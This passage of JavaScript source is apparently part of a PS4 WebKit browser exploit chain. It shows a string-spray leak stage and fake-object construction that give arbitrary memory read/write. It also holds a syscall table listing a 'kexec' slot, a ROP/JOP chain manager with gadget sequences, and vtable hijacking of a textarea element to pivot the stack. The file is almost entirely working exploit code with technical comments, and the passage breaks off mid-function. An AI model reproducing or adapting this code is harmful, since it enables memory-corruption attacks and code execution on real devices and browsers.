  for (let i = 0; i < 5; i++) {
    gc();
    await sleep(50); // wait 50ms, allow DOM update and GC completion
  }
  // Start String Spray
  //log('start string spray');
  while (true) {
    for (let i = 0; i < num_strs; i++) {
      u32[0] = i;
      // on versions like 8.0x:
      // * String.fromCharCode() won't create a 8-bit string. so we use
      //   fromCodePoint() instead
      // * Array.prototype.join() won't try to convert 16-bit strings to
      //   8-bit
      //
      // given the restrictions above, we will ensure "str" is always a
      // 8-bit string. you can check a WebKit source code (e.g. on 8.0x)
      // to see that String.prototype.repeat() will create a 8-bit string
      // if the repeated string's length is 1
      //
      // Array.prototype.join() calls JSC::JSStringJoiner::join(). it
      // returns a plain JSString (not a JSRopeString). that means we
      // have allocated a WTF::StringImpl with the proper size and whose
      // string data is inlined
      const str = [pad, String.fromCodePoint(...u8)].join('');
      strs.push(str);
    }
    if (view.read32(off_strimpl_inline_str) === 0x42424242) {
      view.write32(off_strimpl_strlen, 0xffffffff);
      break;
    }
    strs.length = 0;
    gc();
    await sleep(50);
    str_wait++;
  }
  //log(`JSString reused memory at loop: ${str_wait}`);
  const idx = view.read32(off_strimpl_inline_str + marker_offset);
  //log(`str index: ${hex(idx)}`);
  //log('view:');
  //log(view);
  // versions like 8.0x have a JSC::JSString that have their own m_length
  // field. strings consult that field instead of the m_length of their
  // StringImpl
  //
  // we work around this by passing the string to Error.
  // ErrorInstance::create() will then create a new JSString initialized from
  // the StringImpl of the message argument
  const rstr = Error(strs[idx]).message;
  //log(`str len: ${hex(rstr.length)}`);
  if (rstr.length === 0xffffffff) {
    //log('confirmed correct leaked');
    const addr = view.read64(off_strimpl_m_data).sub(off_strimpl_inline_str);
    //log(`view's buffer address: ${addr}`);
    return new Reader(rstr, view);
  }
  die('JSString was not modified');
}
//================================================================================================
// PSFREE STAGE3 MAKE ARW ========================================================================
//================================================================================================
async function make_arw(reader, view2, pop) {
  const rdr = reader;
  // we have to align the fake object to atomSize (16) else the process
  // crashes. we don't know why
  // since cells (GC memory chunks) are always aligned to atomSize, there
  // might be code that's assuming that all GC pointers are aligned
  // see atomSize from WebKit/Source/JavaScriptCore/heap/MarkedBlock.h at PS4 8.0x
  const fakeobj_off = 0x20;
  const fakebt_base = fakeobj_off + off_size_jsobj;
  // sizeof JSC::IndexingHeader
  const indexingHeader_size = 8;
  // sizeof JSC::ArrayStorage
  const arrayStorage_size = 0x18;
  // there's only the .raw property
  const propertyStorage = 8;
  const fakebt_off = fakebt_base + indexingHeader_size + propertyStorage;
  //log('STAGE: leak CodeBlock');
  // has too be greater than 0x10. the size of JSImmutableButterfly
  const bt_size = 0x10 + fakebt_off + arrayStorage_size;
  const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);
  const view = rdr.rstr_view;
  const view_p = rdr.m_data.sub(off_strimpl_inline_str);
  const view_save = new Uint8Array(view);
  view.fill(0);
  make_ssv_data(view2, view, view_p, bt_addr, bt_size);
  const bt = new BufferView(pop.state);
  view.set(view_save);
  //log('ArrayBuffer pointing to JSImmutableButterfly:');
  //for (let i = 0; i < bt.byteLength; i += 8) {
  //  log(`${bt.read64(i)} | ${hex(i)}`);
  //}
  // the immutable butterfly's indexing type is ArrayWithInt32 so
  // JSImmutableButterfly::visitChildren() won't ask the GC to scan its slots
  // for JSObjects to recursively visit. this means that we can write
  // anything to the the butterfly's data area without fear of a GC crash
  const val_true = 7; // JSValue of "true"
  const strs_cell = rdr.read64(strs_addr);
  bt.write64(fakeobj_off, strs_cell);
  bt.write64(fakeobj_off + off_js_butterfly, bt_addr.add(fakebt_off));
  // since .raw is the first ever created property, it's just besides the
  // indexing header
  bt.write64(fakebt_off - 0x10, val_true);
  // indexing header's publicLength and vectorLength
  bt.write32(fakebt_off - 8, 1);
  bt.write32(fakebt_off - 8 + 4, 1);
  // custom ArrayStorage that allows read/write to index 0. we have to use an
  // ArrayStorage because the structure assigned to the structure ID expects
  // one so visitButterfly() will crash if we try to fake the object with a
  // regular butterfly
  // m_sparseMap
  bt.write64(fakebt_off, 0);
  // m_indexBias
  bt.write32(fakebt_off + 8, 0);
  // m_numValuesInVector
  bt.write32(fakebt_off + 0xc, 1);
  // m_vector[0]
  bt.write64(fakebt_off + 0x10, val_true);
  // immutable_butterfly[0] = fakeobj;
  bt.write64(0x10, bt_addr.add(fakeobj_off));
  const fake = func()[0];
  //log(`fake.raw: ${fake.raw}`);
  //log(`fake[0]: ${fake[0]}`);
  //log(`fake: [${fake}]`);
  const test_val = 3;
  //log(`test setting fake[0] to ${test_val}`);
  fake[0] = test_val;
  if (fake[0] !== test_val) {
    //die(`unexpected fake[0]: ${fake[0]}`);
    die('unexpected fake[0]');
  }
  function addrof(obj) {
    fake[0] = obj;
    return bt.read64(fakebt_off + 0x10);
  }
  // m_mode = WastefulTypedArray, allocated buffer on the fastMalloc heap,
  // unlike FastTypedArray, where the buffer is managed by the GC. This
  // prevents random crashes.
  // See JSGenericTypedArrayView<Adaptor>::visitChildren() from
  // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayViewInlines.h at
  // PS4 8.0x.
  const worker = new DataView(new ArrayBuffer(1));
  const main_template = new Uint32Array(new ArrayBuffer(off_size_view));
  const leaker = {addr: null, 0: 0};
  const worker_p = addrof(worker);
  const main_p = addrof(main_template);
  const leaker_p = addrof(leaker);
  // we'll fake objects using a JSArrayBufferView whose m_mode is
  // FastTypedArray. it's safe to use its buffer since it's GC-allocated. the
  // current fastSizeLimit is 1000. if the length is less than or equal to
  // that, we get a FastTypedArray
  const scaled_sview = off_size_view / 4;
  const faker = new Uint32Array(scaled_sview);
  const faker_p = addrof(faker);
  const faker_vector = rdr.read64(faker_p.add(off_view_m_vector));
  const vector_idx = off_view_m_vector / 4;
  const length_idx = off_view_m_length / 4;
  const mode_idx = off_view_m_mode / 4;
  const bt_idx = off_js_butterfly / 4;
  // fake a Uint32Array using GC memory
  faker[vector_idx] = worker_p.lo;
  faker[vector_idx + 1] = worker_p.hi;
  faker[length_idx] = scaled_sview;
  rdr.set_addr(main_p);
  faker[mode_idx] = rdr.read32_at(off_view_m_mode);
  // JSCell
  faker[0] = rdr.read32_at(0);
  faker[1] = rdr.read32_at(4);
  faker[bt_idx] = rdr.read32_at(off_js_butterfly);
  faker[bt_idx + 1] = rdr.read32_at(off_js_butterfly + 4);
  // fakeobj()
  bt.write64(fakebt_off + 0x10, faker_vector);
  const main = fake[0];
  //log('main (pointing to worker):');
  //for (let i = 0; i < off_size_view; i += 8) {
  //  const idx = i / 4;
  //  log(`${new Int(main[idx], main[idx + 1])} | ${hex(i)}`);
  //}
  new Memory(
    main, worker, leaker,
    leaker_p.add(off_js_inline_prop),
    rdr.read64(leaker_p.add(off_js_butterfly))
  );
  //log('achieved arbitrary r/w');
  rdr.restore();
  // set the refcount to a high value so we don't free the memory, view's
  // death will already free it (a StringImpl is currently using the memory)
  view.write32(0, -1);
  // ditto (a SerializedScriptValue is currently using the memory)
  view2.write32(0, -1);
  // we don't want its death to call fastFree() on GC memory
  make_arw._buffer = bt.buffer;
}

var Console_FW_Version;
var off_kstr;
var off_cpuid_to_pcpu;
var off_sysent_661;
var jmp_rsi;
var patch_elf_loc;
var pthread_offsets;

function mt_get_view_vector(view) {
  if (!ArrayBuffer.isView(view)) {
    throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
  }
  if (mem === null) {
    throw Error('mem is not initialized. make_arw() must be called first to initialize mem.');
  }
  return mem.addrof(view).readp(off_view_m_vector);
}

// put the sycall names that you want to use here
const syscall_map = new Map(Object.entries({
  'read': 3,
  'write': 4,
  'open': 5,
  'close': 6,
  'getpid': 20,
  'setuid': 23,
  'getuid': 24,
  'accept': 30,
  'pipe': 42,
  'ioctl': 54,
  'munmap': 73,
  'mprotect': 74,
  'fcntl': 92,
  'socket': 97,
  'connect': 98,
  'bind': 104,
  'setsockopt': 105,
  'listen': 106,
  'getsockopt': 118,
  'fchmod': 124,
  'socketpair': 135,
  'fstat': 189,
  'getdirentries': 196,
  '__sysctl': 202,
  'mlock': 203,
  'munlock': 204,
  'clock_gettime': 232,
  'nanosleep': 240,
  'sched_yield': 331,
  'kqueue': 362,
  'kevent': 363,
  'rtprio_thread': 466,
  'mmap': 477,
  'ftruncate': 480,
  'shm_open': 482,
  'cpuset_getaffinity': 487,
  'cpuset_setaffinity': 488,
  'jitshm_create': 533,
  'jitshm_alias': 534,
  'evf_create': 538,
  'evf_delete': 539,
  'evf_set': 544,
  'evf_clear': 545,
  'set_vm_container': 559,
  'dmem_container': 586,
  'dynlib_dlsym': 591,
  'dynlib_get_list': 592,
  'dynlib_get_info': 593,
  'dynlib_load_prx': 594,
  'randomized_path': 602,
  'budget_get_ptype': 610,
  'thr_suspend_ucontext': 632,
  'thr_resume_ucontext': 633,
  'blockpool_open': 653,
  'blockpool_map': 654,
  'blockpool_unmap': 655,
  'blockpool_batch': 657,
  // syscall 661 is unimplemented so free for use. a kernel exploit will
  // install "kexec" here
  'aio_submit': 661,
  'kexec': 661,
  'aio_multi_delete': 662,
  'aio_multi_wait': 663,
  'aio_multi_poll': 664,
  'aio_multi_cancel': 666,
  'aio_submit_cmd': 669,
  'blockpool_move': 673
}));

const argument_pops = [
  'pop rdi; ret',
  'pop rsi; ret',
  'pop rdx; ret',
  'pop rcx; ret',
  'pop r8; ret',
  'pop r9; ret'
];

// implementations are expected to have these gadgets:
// * libSceLibcInternal:
//   * __errno - FreeBSD's function to get the location of errno
//   * setcontext - what we call Sony's own version of _Ux86_64_setcontext
//   * getcontext - what we call Sony's own version of _Ux86_64_getcontext
// * anywhere:
//   * the gadgets at argument_pops
//   * ret
//
// setcontext/getcontext naming came from this project:
// https://github.com/libunwind/libunwind
//
// setcontext(context *ctx):
//     mov     rax, qword [rdi + 0x38]
//     sub     rax, 0x10 ; 16
//     mov     qword [rdi + 0x38], rax
//     mov     rbx, qword [rdi + 0x20]
//     mov     qword [rax], rbx
//     mov     rbx, qword [rdi + 0x80]
//     mov     qword [rax + 8], rbx
//     mov     rax, qword [rdi]
//     mov     rbx, qword [rdi + 8]
//     mov     rcx, qword [rdi + 0x10]
//     mov     rdx, qword [rdi + 0x18]
//     mov     rsi, qword [rdi + 0x28]
//     mov     rbp, qword [rdi + 0x30]
//     mov     r8, qword [rdi + 0x40]
//     mov     r9, qword [rdi + 0x48]
//     mov     r10, qword [rdi + 0x50]
//     mov     r11, qword [rdi + 0x58]
//     mov     r12, qword [rdi + 0x60]
//     mov     r13, qword [rdi + 0x68]
//     mov     r14, qword [rdi + 0x70]
//     mov     r15, qword [rdi + 0x78]
//     cmp     qword [rdi + 0xb0], 0x20001
//     jne     done
//     cmp     qword [rdi + 0xb8], 0x10002
//     jne     done
//     fxrstor [rdi + 0xc0]
// done:
//     mov     rsp, qword [rdi + 0x38]
//     pop     rdi
//     ret
//
//  getcontext(context *ctx):
//     mov     qword [rdi], rax
//     mov     qword [rdi + 8], rbx
//     mov     qword [rdi + 0x10], rcx
//     mov     qword [rdi + 0x18], rdx
//     mov     qword [rdi + 0x20], rdi
//     mov     qword [rdi + 0x28], rsi
//     mov     qword [rdi + 0x30], rbp
//     mov     qword [rdi + 0x38], rsp
//     add     qword [rdi + 0x38], 8
//     mov     qword [rdi + 0x40], r8
//     mov     qword [rdi + 0x48], r9
//     mov     qword [rdi + 0x50], r10
//     mov     qword [rdi + 0x58], r11
//     mov     qword [rdi + 0x60], r12
//     mov     qword [rdi + 0x68], r13
//     mov     qword [rdi + 0x70], r14
//     mov     qword [rdi + 0x78], r15
//     mov     rsi, qword [rsp]
//     mov     qword [rdi + 0x80], rsi
//     fxsave  [rdi + 0xc0]
//     mov     qword [rdi + 0xb0], 0x20001
//     mov     qword [rdi + 0xb8], 0x10002
//     xor     eax, eax
//     ret
//
// ROP chain manager base class
// Args:
//   stack_size: the size of the stack
//   upper_pad: the amount of extra space above stack
class ChainBase {
  constructor(stack_size=0x1000, upper_pad=0x10000) {
    this._is_dirty = false;
    this.position = 0;
    const return_value = new Uint32Array(4);
    this._return_value = return_value;
    this.retval_addr = mt_get_view_vector(return_value);
    const errno = new Uint32Array(1);
    this._errno = errno;
    this.errno_addr = mt_get_view_vector(errno);
    const full_stack_size = upper_pad + stack_size;
    const stack_buffer = new ArrayBuffer(full_stack_size);
    const stack = new DataView(stack_buffer, upper_pad);
    this.stack = stack;
    this.stack_addr = mt_get_view_vector(stack);
    this.stack_size = stack_size;
    this.full_stack_size = full_stack_size;
  }
  // use this if you want to write a new ROP chain but don't want to allocate
  // a new instance
  empty() {
    this.position = 0;
  }
  // flag indicating whether .run() was ever called with this chain
  get is_dirty() {
    return this._is_dirty;
  }
  clean() {
    this._is_dirty = false;
  }
  dirty() {
    this._is_dirty = true;
  }
  check_allow_run() {
    if (this.position === 0) {
      throw Error('chain is empty');
    }
    if (this.is_dirty) {
      throw Error('chain already ran, clean it first');
    }
  }
  reset() {
    this.empty();
    this.clean();
  }
  get retval_int() {
    return this._return_value[0] | 0;
  }
  get retval() {
    return new Int(this._return_value[0], this._return_value[1]);
  }
  // return value as a pointer
  get retval_ptr() {
    return new Addr(this._return_value[0], this._return_value[1]);
  }
  set retval(value) {
    const values = lohi_from_one(value);
    const retval = this._return_value;
    retval[0] = values[0];
    retval[1] = values[1];
  }
  get retval_all() {
    const retval = this._return_value;
    return [new Int(retval[0], retval[1]), new Int(retval[2], retval[3])];
  }
  set retval_all(values) {
    const [a, b] = [lohi_from_one(values[0]), lohi_from_one(values[1])];
    const retval = this._return_value;
    retval[0] = a[0];
    retval[1] = a[1];
    retval[2] = b[0];
    retval[3] = b[1];
  }
  get errno() {
    return this._errno[0];
  }
  set errno(value) {
    this._errno[0] = value;
  }
  push_value(value) {
    const position = this.position;
    if (position >= this.stack_size) {
      throw Error(`no more space on the stack, pushed value: ${value}`);
    }
    const values = lohi_from_one(value);
    const stack = this.stack;
    stack.setUint32(position, values[0], true);
    stack.setUint32(position + 4, values[1], true);
    this.position += 8;
  }
  get_gadget(insn_str) {
    const addr = this.gadgets.get(insn_str);
    if (addr === undefined) {
      throw Error(`gadget not found: ${insn_str}`);
    }
    return addr;
  }
  push_gadget(insn_str) {
    this.push_value(this.get_gadget(insn_str));
  }
  push_call(func_addr, ...args) {
    if (args.length > 6) {
      throw TypeError('push_call() does not support functions that have more than 6 arguments');
    }
    for (let i = 0; i < args.length; i++) {
      this.push_gadget(argument_pops[i]);
      this.push_value(args[i]);
    }
    // The address of our buffer seems to be always aligned to 8 bytes.
    // SysV calling convention requires the stack is aligned to 16 bytes on
    // function entry, so push an additional 8 bytes to pad the stack. We
    // pushed a "ret" gadget for a noop.
    if ((this.position & (0x10 - 1)) !== 0) {
      this.push_gadget('ret');
    }
    if (typeof func_addr === 'string') {
      this.push_gadget(func_addr);
    } else {
      this.push_value(func_addr);
    }
  }
  push_syscall(syscall_name, ...args) {
    if (typeof syscall_name !== 'string') {
      throw TypeError(`syscall_name not a string: ${syscall_name}`);
    }
    const sysno = syscall_map.get(syscall_name);
    if (sysno === undefined) {
      throw Error(`syscall_name not found: ${syscall_name}`);
    }
    const syscall_addr = this.syscall_array[sysno];
    if (syscall_addr === undefined) {
      throw Error(`syscall number not in syscall_array: ${sysno}`);
    }
    this.push_call(syscall_addr, ...args);
  }
  // Sets needed class properties
  // Args:
  //   gadgets:
  //     A Map-like object mapping instruction strings (e.g. "pop rax; ret")
  //     to their addresses in memory.
  //   syscall_array:
  //     An array whose indices correspond to syscall numbers. Maps syscall
  //     numbers to their addresses in memory. Defaults to an empty Array.
  static init_class(gadgets, syscall_array=[]) {
    this.prototype.gadgets = gadgets;
    this.prototype.syscall_array = syscall_array;
  }
  // START: implementation-dependent parts
  // the user doesn't need to implement all of these. just the ones they need
  // Firmware specific method to launch a ROP chain
  // Proper implementations will check if .position is nonzero before
  // running. Implementations can optionally check .is_dirty to enforce
  // single-run gadget sequences
  run() {
    throw Error('not implemented');
  }
  // anything you need to do before the ROP chain jumps back to JavaScript
  push_end() {
    throw Error('not implemented');
  }
  push_get_errno() {
    throw Error('not implemented');
  }
  push_clear_errno() {
    throw Error('not implemented');
  }
  // get the rax register
  push_get_retval() {
    throw Error('not implemented');
  }
  // get the rax and rdx registers
  push_get_retval_all() {
    throw Error('not implemented');
  }
  // END: implementation-dependent parts
  // note that later firmwares (starting around > 5.00?), the browser doesn't
  // have a JIT compiler. we programmed in a way that tries to make the
  // resulting bytecode be optimal
  // we intentionally have an incomplete set (there's no function to get a
  // full 128-bit result). we only implemented what we think are the common
  // cases. the user will have to implement those other functions if they
  // need it
  do_call(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_call(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  call_void(...args) {
    this.do_call(...args);
  }
  call_int(...args) {
    this.do_call(...args);
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  call(...args) {
    this.do_call(...args);
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  do_syscall(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_syscall(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  syscall_void(...args) {
    this.do_syscall(...args);
  }
  syscall_int(...args) {
    this.do_syscall(...args);
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  syscall(...args) {
    this.do_syscall(...args);
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  syscall_ptr(...args) {
    this.do_syscall(...args);
    const retval = this._return_value;
    return new Addr(retval[0], retval[1]);
  }
  // syscall variants that throw an error on errno
  do_syscall_clear_errno(...args) {
    if (this.position) {
      throw Error('chain not empty');
    }
    try {
      this.push_clear_errno();
      this.push_syscall(...args);
      this.push_get_retval();
      this.push_get_errno();
      this.push_end();
      this.run();
    } finally {
      this.reset();
    }
  }
  sysi(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    // x | 0 will always be a signed integer
    return this._return_value[0] | 0;
  }
  sys(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    const retval = this._return_value;
    return new Int(retval[0], retval[1]);
  }
  sysp(...args) {
    const errno = this._errno;
    this.do_syscall_clear_errno(...args);
    const err = errno[0];
    if (err !== 0) {
      throw Error(`syscall(${args[0]}) errno: ${err}`);
    }
    const retval = this._return_value;
    return new Addr(retval[0], retval[1]);
  }
}

function get_gadget(map, insn_str) {
  const addr = map.get(insn_str);
  if (addr === undefined) {
    throw Error(`gadget not found: ${insn_str}`);
  }
  return addr;
}

let syscall_array = [];
// libSceNKWebKit.sprx
let libwebkit_base = null;
// libkernel_web.sprx
let libkernel_base = null;
// libSceLibcInternal.sprx
let libc_base = null;
// Chain implementation based on Chain803. Replaced offsets that changed
// between versions. Replaced gadgets that were missing with new ones that
// won't change the API.
// gadgets for the JOP chain
// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
// because jop1-5 was the original chain used by the old implementation of
// Chain803. Now the sequence is jop1-3 then to jop2-5.
// When the scrollLeft getter native function is called on PS4 9.00, rsi is the
// JS wrapper for the WebCore textarea class.
const jop1 = `
mov rdi, qword ptr [rsi + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0xb8]
`;
// Since the method of code redirection we used is via redirecting a call to
// jump to our JOP chain, we have the return address of the caller on entry.
// jop1 pushed another object (via the call instruction) but we want no
// extra objects between the return address and the rbp that will be pushed by
// jop2 later. So we pop the return address pushed by jop1.
// This will make pivoting back easy, just "leave; ret".
const jop2 = `
pop rsi
jmp qword ptr [rax + 0x1c]
`;
const jop3 = `
mov rdi, qword ptr [rax + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x30]
`;
// rbp is now pushed, any extra objects pushed by the call instructions can be ignored
const jop4 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x58]
`;
const jop5 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop6 = `
push rdx
jmp qword ptr [rax]
`;
const jop7 = 'pop rsp; ret';
// the ps4 firmware is compiled to use rbp as a frame pointer
// The JOP chain pushed rbp and moved rsp to rbp before the pivot. The chain
// must save rbp (rsp before the pivot) somewhere if it uses it. The chain must
// restore rbp (if needed) before the epilogue.
// The epilogue will move rbp to rsp (restore old rsp) and pop rbp (which we
// pushed earlier before the pivot, thus restoring the old rbp).
// leave instruction equivalent:
//     mov rsp, rbp
//     pop rbp
const jop8 = `
mov rdi, qword ptr [rsi + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x70]
`;
const jop9 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x30]
`;
const jop10 = `
mov rdx, qword ptr [rdx + 0x50]
mov ecx, 0xa
call qword ptr [rax + 0x40]
`;
const jop11 = `
pop rsi
cmc
jmp qword ptr [rax + 0x7c]
`;

var webkit_gadget_offsets;
var libc_gadget_offsets;
var libkernel_gadget_offsets;

let gadgets = new Map();

function mt_resolve_import(import_addr) {
  if (import_addr.read16(0) !== 0x25ff) {
    throw Error(
      `instruction at ${import_addr} is not of the form: jmp qword`
      + ' [rip + X]');
  }
  // module_function_import:
  //     jmp qword [rip + X]
  //     ff 25 xx xx xx xx // signed 32-bit displacement
  const disp = import_addr.read32(2);
  // assume disp and offset are 32-bit integers
  // x | 0 will always be a signed integer
  const offset = (disp | 0) + 6;
  // The rIP value used by "jmp [rip + X]" instructions is actually the rIP
  // of the next instruction. This means that the actual address used is
  // [rip + X + sizeof(jmp_insn)], where sizeof(jmp_insn) is the size of the
  // jump instruction, which is 6 in this case.
  const function_addr = import_addr.readp(offset);
  return function_addr;
}

var off_ta_vt;
var off_wk_stack_chk_fail;
var off_scf;
var off_wk_strlen;
var off_strlen;

function get_bases() {
  if (mem === null) {
    throw Error('mem is not initialized. make_arw() must be called first to initialize mem.');
  }
  const textarea = document.createElement('textarea');
  const webcore_textarea = mem.addrof(textarea).readp(off_jsta_impl);
  const textarea_vtable = webcore_textarea.readp(0);
  const libwebkit_base = textarea_vtable.sub(off_ta_vt);
  const stack_chk_fail_import = libwebkit_base.add(off_wk_stack_chk_fail);
  const stack_chk_fail_addr = mt_resolve_import(stack_chk_fail_import);
  const libkernel_base = stack_chk_fail_addr.sub(off_scf);
  const strlen_import = libwebkit_base.add(off_wk_strlen);
  const strlen_addr = mt_resolve_import(strlen_import);
  const libc_base = strlen_addr.sub(off_strlen);
  return [
    libwebkit_base,
    libkernel_base,
    libc_base
  ];
}

function init_gadget_map(gadget_map, offset_map, base_addr) {
  for (const [insn, offset] of offset_map) {
    gadget_map.set(insn, base_addr.add(offset));
  }
}

function rw_read(u8_view, offset, size) {
  let res = 0;
  for (let i = 0; i < size; i++) {
    res += u8_view[offset + i] << (i * 8);
  }
  // << returns a signed integer, >>> converts it to unsigned
  return res >>> 0;
}

function rw_read16(u8_view, offset) {
  return rw_read(u8_view, offset, 2);
}

function rw_read32(u8_view, offset) {
  return rw_read(u8_view, offset, 4);
}

function rw_read64(u8_view, offset) {
  return new Int(read32(u8_view, offset), read32(u8_view, offset + 4));
}

function rw_write(u8_view, offset, value, size) {
  for (let i = 0; i < size; i++) {
    u8_view[offset + i] = (value >>> (i * 8)) & 0xff;
  }
}

function rw_write16(u8_view, offset, value) {
  rw_write(u8_view, offset, value, 2);
}

function rw_write32(u8_view, offset, value) {
  rw_write(u8_view, offset, value, 4);
}

function rw_write64(u8_view, offset, value) {
  if (!(value instanceof Int)) {
    throw TypeError('write64 value must be an Int');
  }
  let low = value.lo;
  let high = value.hi;
  for (let i = 0; i < 4; i++) {
    u8_view[offset + i] = (low >>> (i * 8)) & 0xff;
  }
  for (let i = 0; i < 4; i++) {
    u8_view[offset + 4 + i] = (high >>> (i * 8)) & 0xff;
  }
}

class Chain900Base extends ChainBase {
  push_end() {
    this.push_gadget('leave; ret');
  }
  push_get_retval() {
    this.push_gadget('pop rdi; ret');
    this.push_value(this.retval_addr);
    this.push_gadget('mov qword ptr [rdi], rax; ret');
  }
  push_get_errno() {
    this.push_gadget('pop rdi; ret');
    this.push_value(this.errno_addr);
    this.push_call(this.get_gadget('__error'));
    this.push_gadget('mov rax, qword ptr [rax]; ret');
    this.push_gadget('mov dword ptr [rdi], eax; ret');
  }
  push_clear_errno() {
    this.push_call(this.get_gadget('__error'));
    this.push_gadget('pop rsi; ret');
    this.push_value(0);
    this.push_gadget('mov dword ptr [rax], esi; ret');
  }
}

class Chain700_852 extends Chain900Base {
  constructor() {
    super();
    const [rdx, rdx_bak] = mem.gc_alloc(0x58);
    rdx.write64(off_js_cell, this._empty_cell);
    rdx.write64(0x50, this.stack_addr);
    this._rsp = mem.fakeobj(rdx);
  }
  run() {
    this.check_allow_run();
    this._rop.launch = this._rsp;
    this.dirty();
  }
}
class Chain900_960 extends Chain900Base {
  constructor() {
    super();
    // Create a DOM object (textarea) which is used as the exploit pivot source.
    var textarea = document.createElement('textarea');
    this._textarea = textarea;
    // Get the JS and WebCore pointers associated with the textarea element.
    var js_ta = mem.addrof(textarea);
    var webcore_ta = js_ta.readp(0x18);
    this._webcore_ta = webcore_ta;
    // Allocate a fake vtable.
    // - Uint8Array is lightweight and fast.
    // - 0x200 bytes is enough for all required gadget offsets.
    // - A reference is stored to prevent garbage collection.
    var vtable = new Uint8Array(0x200);
    var old_vtable_p = webcore_ta.readp(0);
    this._vtable = vtable; // Prevent GC
    this._old_vtable_p = old_vtable_p; // Used for possible restore
    // Write needed JOP entry gadgets into the fake vtable.
    rw_write64(vtable, 0x1b8, this.get_gadget(jop1));
    if ((config_target >= 0x900) && (config_target < 0x950)) {
      rw_write64(vtable, 0xb8, this.get_gadget(jop2));
      rw_write64(vtable, 0x1c, this.get_gadget(jop3));
    } else {
      rw_write64(vtable, 0xb8, this.get_gadget(jop11));
      rw_write64(vtable, 0x7c, this.get_gadget(jop3));
    }
    // Allocate rax_ptrs, which serves as the JOP pointer table.
    // - This buffer must be referenced on the class instance to avoid GC.
    var rax_ptrs = new Uint8Array(0x100);
    var rax_ptrs_p = mt_get_view_vector(rax_ptrs);
    this._rax_ptrs = rax_ptrs; // Prevent GC
    rw_write64(rax_ptrs, 0x30, this.get_gadget(jop4));
    rw_write64(rax_ptrs, 0x58, this.get_gadget(jop5));
    rw_write64(rax_ptrs, 0x10, this.get_gadget(jop6));
    rw_write64(rax_ptrs, 0x00, this.get_gadget(jop7));
    // Stack pivot target
    rw_write64(this._rax_ptrs, 0x18, this.stack_addr);
    // Allocate jop_buffer which holds a pointer to rax_ptrs.
    // - Must also be preserved to prevent garbage collection.
    var jop_buffer = new Uint8Array(8);
    var jop_buffer_p = mt_get_view_vector(jop_buffer);
    this._jop_buffer = jop_buffer; // Prevent GC
    rw_write64(jop_buffer, 0, rax_ptrs_p);
    // Link jop_buffer into the fake vtable.
    // - This is the actual JOP entry point used by WebKit.
    rw_write64(vtable, 8, jop_buffer_p);
  }
  run() {
    this.check_allow_run();
    // change vtable
    this._webcore_ta.write64(0, mt_get_view_vector(this._vtable));
    // jump to JOP chain
    this._textarea.scrollLeft;
    // restore vtable
    this._webcore_ta.write64(0, this._old_vtable_p);
    this.dirty();
  }
}
let Chain = null;

// creates an ArrayBuffer whose contents is copied from addr
function make_buffer(addr, size) {
  // see enum TypedArrayMode from
  // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h
  // at webkitgtk 2.34.4
  //
  // see possiblySharedBuffer() from
  // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h
  // at webkitgtk 2.34.4

  // We will create an OversizeTypedArray via requesting an Uint8Array whose
  // number of elements will be greater than fastSizeLimit (1000).
  //
  // We will not use a FastTypedArray since its m_vector is visited by the
  // GC and we will temporarily change it. The GC expects addresses from the
  // JS heap, and that heap has metadata that the GC uses. The GC will likely
  // crash since valid metadata won't likely be found at arbitrary addresses.
  //
  // The FastTypedArray approach will have a small time frame where the GC
  // can inspect the invalid m_vector field.
  //
  // Views created via "new TypedArray(x)" where "x" is a number will always
  // have an m_mode < WastefulTypedArray.
  const u = new Uint8Array(1001);
  const u_addr = mem.addrof(u);
  // we won't change the butterfly and m_mode so we won't save those
  const old_addr = u_addr.read64(off_view_m_vector);
  const old_size = u_addr.read32(off_view_m_length);
  u_addr.write64(off_view_m_vector, addr);
  u_addr.write32(off_view_m_length, size);
  const copy = new Uint8Array(u.length);
  copy.set(u);
  // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
  // associated with them, if we ask for view.buffer, the view will be
  // converted into a WastefulTypedArray and an ArrayBuffer will be created.
  // This is done by calling slowDownAndWasteMemory().
  //
  // We can't use slowDownAndWasteMemory() on u since that will create a
  // JSC::ArrayBufferContents with its m_data pointing to addr. On the
  // ArrayBuffer's death, it will call WTF::fastFree() on m_data. This can
  // cause a crash if the m_data is not from the fastMalloc heap, and even if
  // it is, freeing abitrary addresses is dangerous as it may lead to a
  // use-after-free.
  const res = copy.buffer;
  // restore
  u_addr.write64(off_view_m_vector, old_addr);
  u_addr.write32(off_view_m_length, old_size);
  return res;
}

function init_syscall_array(
  syscall_array,
  libkernel_web_base,
  max_search_size
) {
  if ((typeof max_search_size !== 'number') || !isFinite(max_search_size) || (Math.floor(max_search_size) !== max_search_size)) {
    throw TypeError(
      `max_search_size is not a integer: ${max_search_size}`);
  }
  if (max_search_size < 0) {
